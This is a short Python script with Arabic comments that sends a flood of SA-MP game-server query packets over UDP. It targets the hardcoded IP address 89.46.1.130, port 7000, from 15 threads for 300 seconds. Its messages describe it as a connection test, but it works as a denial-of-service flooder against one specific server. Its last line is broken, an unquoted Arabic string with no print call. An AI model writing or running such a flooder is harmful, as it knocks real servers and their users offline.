import socket
import time
import threading

TARGET_IP = "89.46.1.130"  # IP الهدف
TARGET_PORT = 7000        # المنفذ
DURATION = 300              # المدة بالثواني
THREADS_COUNT = 15          # عدد الخيوط (Threads) لزيادة السرعة

def worker(end_time):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # بناء حزمة SAMP بشكل صحيح
    payload = b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
    
    count = 0
    while time.time() < end_time:
        try:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
            count += 1
        except Exception:
            pass
    client.close()
    print(f"خيط (Thread) انتهى، تم إرسال {count} حزمة.")

def main():
    end_time = time.time() + DURATION
    print(f"جاري بدء اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS_COUNT} خيوط...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=worker, args=(end_time,))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
تم الانتهاء من الاختبار.

if __name__ == "__main__":
    main()
